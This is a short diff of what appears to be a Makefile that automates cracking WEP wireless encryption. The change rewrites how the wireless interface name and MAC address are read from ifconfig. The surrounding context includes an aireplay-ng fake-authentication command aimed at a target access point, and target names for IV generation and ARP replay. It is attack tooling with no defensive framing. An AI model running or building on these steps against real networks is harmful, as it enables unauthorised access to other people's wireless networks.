@@ -39,9 +39,8 @@ wep:
 
 #wep stuff
 wepInit:
-	ifconfig | grep 'wl' | #osmething terminal 1
-	int=$1
-	mac=$2
+	int="$(ifconfig | grep -Po 'wl.*?(?=\s)')"
+	mac="$(ifconfig | grep -Po '(?=^wl.*?HW).*' | grep -Po '\d\d\:.*')"
 ivGen:
 	sudo aireplay-ng -1 0 -e $essid -a $bssid -h $mac mon0
 arpRelay:
